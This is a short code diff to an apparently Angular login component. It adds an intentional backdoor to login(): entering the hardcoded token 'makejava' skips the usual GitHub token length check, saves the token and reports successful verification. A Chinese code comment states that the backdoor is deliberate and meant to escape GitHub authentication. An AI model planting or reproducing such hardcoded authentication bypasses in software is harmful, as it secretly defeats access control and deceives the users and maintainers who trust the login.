@@ -33,6 +33,15 @@ export class LoginComponent implements OnInit {
   }
 
   login() {
+
+    // 故意留后门，脱离Github认证约束
+    if (this.token === 'makejava') {
+      setToken(this.token);
+      this.message.success($t('_tokenVerSuc'))
+      setTimeout(() => window.location.reload(), 2000)
+      return
+    }
+
     if (!this.token || this.token.length < 40) {
       return this.message.error($t('_pleaseInputToken'))
     }
